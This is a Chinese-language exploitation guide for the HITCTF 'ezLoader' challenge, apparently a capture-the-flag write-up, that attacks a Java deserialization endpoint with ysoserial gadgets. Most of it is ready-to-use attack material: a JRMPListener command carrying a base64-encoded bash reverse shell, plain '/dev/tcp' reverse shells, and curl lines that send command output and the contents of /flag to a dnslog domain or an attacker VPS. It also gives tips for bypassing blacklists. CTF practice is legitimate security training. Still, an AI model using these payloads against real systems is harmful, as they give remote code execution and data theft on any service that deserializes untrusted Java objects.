# HITCTF ezLoader - 完整利用指南

## 🎯 问题诊断

### 已确认的情况
1. ✅ Java 17+ 模块化问题已修复
2. ✅ Payload 可以成功生成
3. ❌ 目标服务器**没有 commons-collections 依赖**
4. ⚠️  所有 CC 链返回 500 错误

### 服务器返回 500 的原因
```json
{"timestamp":"2025-12-06T09:04:22.993+00:00","status":500,"error":"Internal Server Error","path":"/unser"}
```

可能原因:
1. 反序列化成功但 `toString()` 抛异常
2. Gadget 依赖的类不存在（如 commons-collections）
3. JDK 版本不匹配（如 Jdk7u21 需要 JDK <= 7u21）

---

## 🚀 推荐利用流程

### 阶段 1: 确认漏洞存在 (URLDNS)

```bash
# 方法 1: 使用脚本
python test_urldns.py

# 输入你的 dnslog 域名 (从 dnslog.cn 获取)
# 例如: abc123.dnslog.cn

# 方法 2: 命令行参数
python test_urldns.py your-subdomain.dnslog.cn
```

**判断标准**:
- ✅ DNSlog 收到请求 → 反序列化漏洞存在，可继续利用
- ❌ 没有收到请求 → 可能无法连接外网，或漏洞不可用

---

### 阶段 2: JRMPClient 万能方法 (推荐)

**为什么选择 JRMPClient?**
- ✅ 不需要目标有任何外部依赖
- ✅ 绕过大多数黑名单
- ✅ 可以使用任意 gadget

**步骤**:

#### Step 1: 在 VPS 上启动 RMI 监听器

```bash
# VPS 上执行 (需要有 ysoserial.jar)
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ZT1VSX0lQL1BPUlQgMD4mMQ==}|{base64,-d}|{bash,-i}'

# 替换 YOUR_IP/PORT 为你的 VPS IP 和监听端口
```

**可用的 Gadget**:
- `Jdk7u21` - 无依赖，但需要 JDK <= 7u21
- `URLDNS` - 仅用于测试
- `CommonsCollections6` - 如果目标碰巧有 CC 库

#### Step 2: 本地执行攻击脚本

```bash
python exp_jrmp.py

# 输入:
# VPS IP: 你的公网 IP
# 端口: 1099 (与 VPS 监听器一致)
# 命令: whoami (这个会在 VPS 端设置)
```

**预期流程**:
```
攻击者本地                目标服务器              攻击者 VPS
    |                       |                       |
    |--[JRMPClient]-------->|                       |
    |                       |                       |
    |                       |--[RMI Connect]------->|
    |                       |                       |
    |                       |<--[Evil Gadget]-------|
    |                       |                       |
    |                       | (反序列化 & RCE)       |
    |                       |                       |
```

---

### 阶段 3: 原生 JDK 链 (备选)

如果 JRMPClient 无法连接外网，尝试原生链:

```bash
python exp_native.py

# 选项:
# 1. URLDNS - 仅测试
# 2. Jdk7u21 - 需要 JDK <= 7u21
# 3. JRMPClient - 需要外网连接
# 5. 自动尝试所有链
```

---

## 🔧 故障排查

### Q1: URLDNS 没收到 DNS 请求
**可能原因**:
- 目标服务器无法连接外网
- 防火墙拦截 DNS 请求
- DNSlog 域名输入错误

**解决方案**:
- 尝试其他 DNSlog 平台
- 检查目标是否在内网环境

### Q2: JRMPClient VPS 没收到连接
**可能原因**:
- VPS 防火墙没开放端口
- 目标服务器无法连接外网
- IP/端口输入错误

**检查方法**:
```bash
# VPS 上检查端口是否监听
netstat -tlnp | grep 1099

# 本地测试 VPS 连接性
nc -zv YOUR_VPS_IP 1099
```

### Q3: Jdk7u21 返回 500
**原因**: 目标 JDK 版本太高（> 7u21）

**解决方案**:
- 尝试其他版本特定的链
- 查找目标 JDK 版本信息
- 使用 JRMPClient 绕过

### Q4: 所有方法都返回 500
**可能情况**:
1. 反序列化确实执行了，但 `toString()` 报错（正常）
2. 命令已执行但无回显
3. 需要使用特定版本的 gadget

**验证方法**:
```bash
# 尝试无回显命令（写文件、反弹 shell）
curl http://YOUR_VPS/$(whoami)
bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1
```

---

## 📚 可用脚本总结

| 脚本 | 用途 | 推荐度 |
|------|------|--------|
| `test_urldns.py` | 测试反序列化漏洞 | ⭐⭐⭐⭐⭐ |
| `exp_jrmp.py` | JRMPClient 通用利用 | ⭐⭐⭐⭐⭐ |
| `exp_native.py` | 原生 JDK 链利用 | ⭐⭐⭐⭐ |
| `exp.py` | CC 链利用（目标无依赖） | ⭐⭐ |

---

## 🎁 命令执行 Payload 示例

### 反弹 Shell (Base64 绕过)
```bash
# 编码
echo 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1' | base64
# 输出: YmFzaCAtaSA+JiAvZGV2L3RjcC9ZT1VSX0lQL1BPUlQgMD4mMQ==

# Payload
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ZT1VSX0lQL1BPUlQgMD4mMQ==}|{base64,-d}|{bash,-i}
```

### DNS 外带数据
```bash
# 外带当前用户
curl http://$(whoami).YOUR_DOMAIN.dnslog.cn

# 外带文件内容
curl http://$(cat /flag | base64).YOUR_DOMAIN.dnslog.cn
```

### HTTP 外带
```bash
# 外带命令结果
curl http://YOUR_VPS:8000/$(whoami)

# VPS 监听
python3 -m http.server 8000
```

---

## 💡 高级技巧

### 1. 自定义黑名单绕过
如果发现新的黑名单类，可以:
- 使用 Gadget 链的变种
- 寻找未被禁止的类组合
- 利用 Java 反射动态构造

### 2. 无回显利用
- 时间盲注: `sleep 10 && curl ...`
- DNS 外带: URLDNS + 命令结果
- HTTP 外带: curl + VPS 监听

### 3. 题目特定利用
题目名 "ezLoader" 可能暗示:
- 自定义类加载器利用
- URLClassLoader 远程加载
- 动态字节码注入

---

## 🔗 参考资源

- [ysoserial](https://github.com/frohoff/ysoserial)
- [JRMPClient 原理](https://www.anquanke.com/post/id/192619)
- [Java 反序列化总结](https://xz.aliyun.com/t/7031)
